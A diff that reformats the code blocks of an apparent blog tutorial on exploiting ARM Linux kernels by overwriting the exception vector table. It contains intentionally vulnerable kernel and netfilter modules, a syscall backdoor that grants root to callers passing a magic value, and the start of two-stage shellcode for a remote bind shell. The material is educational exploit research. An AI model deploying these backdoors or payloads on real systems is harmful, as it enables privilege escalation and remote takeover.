@@ -71,24 +71,24 @@
 &lt;p&gt;There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let's try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let's now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.&lt;/p&gt;
 &lt;h2 id="local-scenario"&gt;Local scenario&lt;/h2&gt;
 &lt;p&gt;The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// called when &amp;#39;write&amp;#39; system call is done on the device file&lt;/span&gt;
-&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;ssize_t&lt;/span&gt; &lt;span class="nf"&gt;on_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;filp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;loff_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;off&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="c1"&gt;// called when &amp;#39;write&amp;#39; system call is done on the device file&lt;/span&gt;
+    &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;ssize_t&lt;/span&gt; &lt;span class="nf"&gt;on_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;filp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;loff_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;off&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
-    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-        &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="k"&gt;else&lt;/span&gt;
-        &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+            &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;else&lt;/span&gt;
+            &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
-    &lt;span class="n"&gt;copy_from_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;amp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
-    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+        &lt;span class="n"&gt;copy_from_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+        &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
 
-&lt;span class="nl"&gt;end&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="nl"&gt;end&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -104,24 +104,24 @@ It looks like nothing is there so we have around 480 bytes to store our backdoor
     2. Overwrite the SWI exception vector with a branch to &lt;em&gt;0xffff0020&lt;/em&gt;.&lt;br&gt;
     3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.&lt;br&gt;
 Here is the backdoor's code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;;check if magic&lt;/span&gt;
-    &lt;span class="nf"&gt;cmp&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mh"&gt;0xb0000000&lt;/span&gt;
-    &lt;span class="nf"&gt;bne&lt;/span&gt;     &lt;span class="nv"&gt;exit&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    ;check if magic
+        cmp     r7, #0xb0000000
+        bne     exit
 
-&lt;span class="nl"&gt;elevate:&lt;/span&gt;
-    &lt;span class="nf"&gt;stmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+    elevate:
+        stmfd   sp!,{r0-r12}
 
-    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xc0049a00&lt;/span&gt;     &lt;span class="c1"&gt;;prepare_kernel_cred&lt;/span&gt;
-    &lt;span class="nf"&gt;blx&lt;/span&gt;     &lt;span class="nv"&gt;r3&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xc0049438&lt;/span&gt;     &lt;span class="c1"&gt;;commit_creds&lt;/span&gt;
-    &lt;span class="nf"&gt;blx&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;
+        mov     r0, #0
+        ldr     r3, =0xc0049a00     ;prepare_kernel_cred
+        blx     r3
+        ldr     r4, =0xc0049438     ;commit_creds
+        blx     r4
 
-    &lt;span class="nf"&gt;ldmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;  &lt;span class="c1"&gt;;return to userland&lt;/span&gt;
+        ldmfd   sp!, {r0-r12, pc}^  ;return to userland
 
-&lt;span class="c1"&gt;;go to syscall handler&lt;/span&gt;
-&lt;span class="nl"&gt;exit:&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;980&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;      &lt;span class="c1"&gt;;go to normal swi handler&lt;/span&gt;
+    ;go to syscall handler
+    exit:
+        ldr     pc, [pc, #980]      ;go to normal swi handler
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -129,17 +129,17 @@ Here is the backdoor's code:&lt;/p&gt;
 &lt;center&gt;&lt;img alt="Local PoC" src="/images/corrupting_arm_evt/local_poc.png"&gt;&lt;/center&gt;  &lt;/p&gt;
 &lt;h2 id="remote-scenario"&gt;Remote scenario&lt;/h2&gt;
 &lt;p&gt;For this example, we will use a netfilter module with a similar vulnerability as the previous one:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;-&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
-        &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;tcphdr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;skb_network_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_hdrlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
-        &lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ntohs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;9999&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
-            &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)((&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;doff&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
-            &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-            &lt;span class="n"&gt;len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)))[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-            &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-            &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+            &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;tcphdr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;skb_network_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_hdrlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+            &lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ntohs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;9999&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
+                &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)((&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;doff&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+                &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+                &lt;span class="n"&gt;len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)))[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+                &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="p"&gt;}&lt;/span&gt;
         &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -154,48 +154,48 @@ Every system call goes through the SWI vector so we won't have to wait too much 
     3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.&lt;br&gt;
     4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  &lt;/p&gt;
 &lt;p&gt;Here is the stage 1-2 shellcode:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;stage_1:&lt;/span&gt;
-    &lt;span class="nf"&gt;adr&lt;/span&gt;     &lt;span class="nv"&gt;lr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;stage_2&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;lr&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
-    &lt;span class="nf"&gt;stmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xe59ff410&lt;/span&gt;     &lt;span class="c1"&gt;; intial value at 0xffff0008 which is&lt;/span&gt;
-                                &lt;span class="c1"&gt;; ldr     pc, [pc, #1040] ; 0xffff0420&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xffff0008&lt;/span&gt;
-    &lt;span class="nf"&gt;str&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-    &lt;span class="nf"&gt;ldmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;  &lt;span class="c1"&gt;; return to userland&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    stage_1:
+        adr     lr, stage_2
+        push    {lr}
+        stmfd   sp!, {r0-r12}
+        ldr     r0, =0xe59ff410     ; intial value at 0xffff0008 which is
+                                    ; ldr     pc, [pc, #1040] ; 0xffff0420
+        ldr     r1, =0xffff0008
+        str     r0, [r1]
+        ldmfd   sp!, {r0-r12, pc}^  ; return to userland
 
-&lt;span class="nl"&gt;stage_2:&lt;/span&gt;
-    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;     &lt;span class="c1"&gt;; /bin&lt;/span&gt;
